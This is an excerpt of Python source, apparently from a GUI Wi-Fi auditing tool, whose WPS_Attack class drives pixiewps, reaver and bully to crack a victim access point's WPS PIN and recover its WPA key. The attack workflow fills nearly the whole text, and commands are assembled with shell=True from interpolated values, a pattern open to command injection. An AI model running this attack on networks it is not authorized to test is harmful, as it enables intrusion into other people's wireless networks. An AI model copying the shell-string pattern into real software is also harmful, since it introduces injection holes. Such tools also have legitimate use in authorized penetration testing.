...
class WPS_Attack(QtCore.QThread):
    ...
    def pixiewps_Installed(self):
        '''Checks if pixiewps tool is installed'''
        return_code = subprocess.getstatusoutput("which pixiewps")[0]
        return return_code == 0

    def bully_Installed(self):
        '''Checks if bully tool is installed'''
        return_code = subprocess.getstatusoutput("which bully")[0]
        return return_code == 0
    ...
    def _bruteforce_WPS_Device(self):
        ...
        # Try PixieWPS first for offline attack
        if self.pixiewps_Installed():
            try:
                pixie_cmd = f"pixiewps -e -r /tmp/pixie_wps_{self.victim_MAC_Addr}.wpc -b {self.victim_MAC_Addr}"
                pixie_result = subprocess.run(pixie_cmd, shell=True, capture_output=True, text=True, timeout=30)

                if pixie_result.returncode == 0 and 'WPS pin' in pixie_result.stdout:
                    pin_match = re.search(r'WPS pin:\s*(\d+)', pixie_result.stdout)
                    if pin_match:
                        self._wps_pin = pin_match.group(1)
                        self.Cracked_WPS_Pin_signal.emit()
                        # Try to get key with the PIN
                        reaver_cmd = f"reaver -i {self.monitor_interface} -b {self.victim_MAC_Addr} -c {channel} -p {self._wps_pin} -vv"
                        reaver_proc = subprocess.Popen(reaver_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        output, _ = reaver_proc.communicate(timeout=60)

                        key_match = wps_key_regex.search(str(output))
                        if key_match:
                            self._final_key = key_match.group(1)
        ...
        self.bruteforce_sys_proc.stdin.write(b'y')                   # Restore previous session if any
    ...
    def _bruteforce_WPS_Device_Bully(self):
        """Alternative WPS attack using Bully tool"""
        if not self.bully_Installed():
            return False

        channel = self._wps_client_info[self.victim_MAC_Addr.upper()]
        bully_cmd = f"bully -b {self.victim_MAC_Addr} -c {channel} {self.monitor_interface}"

        try:
            process = subprocess.Popen(bully_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, _ = process.communicate(timeout=300)  # 5 minute timeout

            output_str = output.decode('utf-8', errors='ignore')

            # Check for successful PIN recovery
            pin_match = re.search(r'Pin:\s*(\d+)', output_str, re.IGNORECASE)
            if pin_match:
                self._wps_pin = pin_match.group(1)
                self.Cracked_WPS_Pin_signal.emit()

                # Try to get WPA key with PIN
                key_match = re.search(r'Key:\s*([^\s]+)', output_str, re.IGNORECASE)
                if key_match:
                    self._final_key = key_match.group(1)
                    self.Cracked_WPS_Key_signal.emit()
                    return True
    ...
    def start_Attack_WPS_Device(self):
        ...
        # Try Bully first if available
        if self.bully_Installed():
            success = self._bruteforce_WPS_Device_Bully()
            if success:
                return

        # Fallback to Reaver/PixieWPS combination
